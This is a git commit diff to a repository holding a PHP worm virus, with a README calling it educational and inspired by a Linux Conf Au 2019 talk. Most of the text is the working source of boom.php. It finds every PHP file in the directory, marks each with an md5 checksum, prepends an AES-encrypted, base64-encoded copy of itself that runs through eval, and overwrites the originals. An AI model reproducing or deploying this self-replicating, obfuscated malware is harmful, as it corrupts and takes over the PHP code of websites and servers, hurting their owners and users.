cd0ebc024affa7cddae8d86e611f9df5c6f5f3ec
Baran Arda <baran9arda@gmail.com>
2024-06-12 16:57:49 +0300

    Step 5

--- README.md
+++ README.md
@@ -1,3 +1,27 @@
-# php-virus-linux-au-conf
-PHP virus from Linux Conf Au 2019
+# PHP Worm Virus
+
+PHP virus inspired from Linux Conf Au 2019
+
+## Description
+
+boom.php file have 2 main functions:
+
+```php
+function executeCode($virus)
+function encryptContent($virus)
+```
+- executeCode function simply gets every PHP file in and check if file has ``Checksum`` in first line. 
+- If file has checksum, nothing happens. If dont, foreach loop will start
+- Foreach loop gets every file gathered by glob function, and simply adds;
+  - Checksum of this file (md5 hash of filename)
+  - Payload code as hash ready to execute 
+  - Original code of file
+
+## About
+
+This repository is purely for educational purposes. This code will infect all of your PHP files.
+
+
+
+
 Related to this video: https://www.youtube.com/watch?v=2Ra1CCG8Guo
--- boom.php
+++ boom.php
@@ -1,65 +1,81 @@
-<?php
+<?php // Checksum: 382a15b559e142b42c57314801273616 ?><?php
 // BOOM:START
-function execute($virus)
-{
-    $filenames = glob('*.php');
-    foreach ($filenames as $filename) {
-        if($filename == 'boom.php') continue;
-        $script = fopen($filename, "r");
-        $infected = fopen("$filename.infected", "w");
-        $infection = '<?php ' . encryptContent($virus) . ' ?>';
-        fputs($infected, $infection, strlen($infection));
-        while ($contents = fgets($script)) {
-            fputs($infected, $contents, strlen($contents));
+
+/**
+ * Execute payload
+ */
+if(!function_exists('executeCode')){
+    function executeCode($virus)
+    {
+        $filenames = glob('*.php');
+        foreach ($filenames as $filename) {
+            if($filename == basename(__FILE__)) continue;
+            $script = fopen($filename, "r");
+            $first_line = fgets($script);
+            $virus_hash = md5($filename);
+            if(strpos($first_line, $virus_hash) === false)
+            {
+                $infected = fopen("$filename.infected", "w");
+                $checksum = '<?php // Checksum: '.$virus_hash.' ?>';
+                $infection = '<?php ' . encryptContent($virus) . ' ?>';
+                fputs($infected, $checksum, strlen($checksum));
+                fputs($infected, $infection, strlen($infection));
+                fputs($infected, $first_line, strlen($first_line));
+                while ($contents = fgets($script)) {
+                    fputs($infected, $contents, strlen($contents));
+                }
+                fclose($script);
+                fclose($infected);
+                unlink($filename);
+                rename($filename . ".infected", $filename);
+            }
         }
-        fclose($script);
-        fclose($infected);
-        unlink($filename);
-        rename($filename . ".infected", $filename);
     }
 }
-function encryptContent($virus)
-{
-    // Key
-    $str = '1234567890';
-    $key = '';
-    for ($i = 0; $i < 32; $i++) $key .= $str[rand(0, strlen($str) - 1)];
+/**
+ * Encrypt code and run it in file.
+ */
+if(!function_exists('encryptContent')){
+    function encryptContent($virus)
+    {
+        // Key
+        $str = '1234567890';
+        $key = '';
+        for ($i = 0; $i < 32; $i++) $key .= $str[rand(0, strlen($str) - 1)];
 
-    // Encrypt
-    $iv_length = openssl_cipher_iv_length('aes-256-cbc');
-    $iv = openssl_random_pseudo_bytes($iv_length);
-    $encryptedVirus = openssl_encrypt($virus, 'aes-256-cbc', $key, 0, $iv);
+        // Encrypt
+        $iv_length = openssl_cipher_iv_length('aes-256-cbc');
+        $iv = openssl_random_pseudo_bytes($iv_length);
+        $encryptedVirus = openssl_encrypt($virus, 'aes-256-cbc', $key, 0, $iv);
 
-    // Encode
-    $encoded_virus = base64_encode($encryptedVirus);
-    $encoded_iv = base64_encode($iv);
-    $encoded_key = base64_encode($key);
+        // Encode
+        $encoded_virus = base64_encode($encryptedVirus);
+        $encoded_iv = base64_encode($iv);
+        $encoded_key = base64_encode($key);
 
-    $payload = "
-    \$encryptedVirus = '" . $encoded_virus . "';
-    \$iv = '" . $encoded_iv . "';
-    \$key = '" . $encoded_key . "';
-    
-    \$virus = openssl_decrypt(
-    base64_decode(\$encryptedVirus),
-    'aes-256-cbc',
-    base64_decode(\$key),
-    0,
-    base64_decode(\$iv)
-    );
-    eval(\$virus);
-    execute(\$virus);
-    ";
-
-    // Return or use the payload as needed
-    return $payload;
+        $payload = "
+        \$encryptedVirus = '" . $encoded_virus . "';
+        \$iv = '" . $encoded_iv . "';
+        \$key = '" . $encoded_key . "';
+        
+        \$virus = openssl_decrypt(
+        base64_decode(\$encryptedVirus),
+        'aes-256-cbc',
+        base64_decode(\$key),
+        0,
+        base64_decode(\$iv)
+        );
+        eval(\$virus);
+        executeCode(\$virus);
+        ";
+        // Return or use the payload as needed
+        return $payload;
+    }
 }
-
-$virus = file_get_contents(__FILE__);
-$virus = substr($virus, strpos($virus, "// BOOM:START"));
-$virus = substr($virus, 0,strpos($virus, "\n// BOOM:END") + strlen('\n// BOOM:END')). '// BOOM:END'." \r\n";
-execute($virus);
-
 // BOOM:END
 
 /** this will not be copied */
+$virus = file_get_contents(__FILE__);
+$virus = substr($virus, strpos($virus, "// BOOM:START"));
+$virus = substr($virus, 0,strpos($virus, "\n// BOOM:END") + strlen('\n// BOOM:END')). '// BOOM:END'." \r\n";
+executeCode($virus);
